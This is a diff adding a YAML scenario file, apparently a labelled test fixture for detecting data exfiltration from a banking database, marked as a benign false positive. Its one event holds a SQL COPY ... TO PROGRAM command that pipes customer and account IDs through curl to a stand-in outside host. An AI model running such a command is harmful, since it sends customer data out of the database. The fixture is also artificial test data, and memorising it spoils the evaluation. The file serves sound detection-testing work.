@@ -1,0 +1,21 @@
+scenario_id: banking_copyprog_ben_01
+family_id: banking_copy_to_program_01
+domain: banking
+matched_pair_id: banking_copyprog_pair_01
+matched_dimensions:
+  fixed: [process_tree_shape, syscall_sequence, timing_pattern, role]
+  varied: [sql_content]
+time_of_day: "22:10"
+default_class: benign
+rule_engine_relationship: benign_false_positive
+sessions:
+  - session_label: exfil
+    role: batch_etl_service
+    anchor: db
+    timing:
+      tempo: steady
+      step_gaps_seconds: [5.0]
+    events:
+      - step_id: dump
+        sql: "COPY (SELECT customer_id, account_id FROM accounts WHERE branch_id = 'BR-021') TO PROGRAM 'curl -sX POST https://mirror-b.datasink.example/ingest -d @-'"
+        connects_to: {ip: "185.220.101.10", port: 8443}
